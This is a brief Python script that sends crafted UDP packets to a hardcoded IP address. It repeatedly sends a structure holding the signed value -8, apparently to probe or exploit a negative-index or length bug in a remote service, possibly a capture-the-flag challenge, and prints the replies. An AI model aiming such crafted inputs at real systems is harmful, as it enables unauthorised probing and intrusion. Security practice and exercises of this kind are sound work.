import struct, sys
import socket, time

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
p = ("18.118.161.198", int(sys.argv[1]))

for i in range(255):
    payload = b""
    payload += struct.pack("<h", 0)
    payload += struct.pack("<h", 0)
    payload += struct.pack("<i", -8)

    # Recv after each send to ensure correct ordering
    s.sendto(payload, p)
    print(time.time(), s.recvfrom(100000))

payload = b""
payload += struct.pack("<h", 0)
payload += struct.pack("<h", 0)
payload += struct.pack("<i", 9)

s.sendto(payload, p)
print(s.recvfrom(100000))